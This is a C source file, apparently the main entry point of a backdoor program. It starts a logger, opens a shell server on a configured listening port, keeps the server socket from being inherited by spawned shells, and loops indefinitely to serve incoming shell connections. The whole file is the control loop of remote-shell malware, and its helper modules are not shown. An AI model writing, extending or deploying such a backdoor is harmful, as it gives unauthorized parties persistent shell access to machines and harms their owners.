#include <stdio.h>
#include <stdbool.h>
#include <fcntl.h>
#include <string.h>

#include "common.h"
#include "shell.h"
#include "logger.h"
#include "backdoor.h"


int main(void)
{
    return_code_t result = RC_UNINITIALIZED;
    logger__log_t logger = {0};
    int32_t shell_server = -1;
    int32_t temp_result = -1;

    result = logger__init_logger(LOG_PATH, &logger);
    if (RC_SUCCESS != result){
        goto l_cleanup;
    }

    result = shell__init_server(SHELL_LISTENING_PORT, &logger, &shell_server);
    if (RC_SUCCESS != result){
        goto l_cleanup;
    }

    // We don't want to pass the shell_server's fd to the shell process.
    temp_result = fcntl(shell_server, F_SETFD, FD_CLOEXEC);
    if (-1 == temp_result){
        handle_perror("Fcntl failed", RC_BACKDOOR__MAIN__FCNTL_FAILED);
    }

    while (true){
        result = shell__handle_new_connection(shell_server, &logger);
        if (RC_SUCCESS != result){
            break;
        }
    }

l_cleanup:
    shell__destroy_server(&shell_server, &logger);
    logger__destory_logger(&logger);
    
    return (int)result;
}
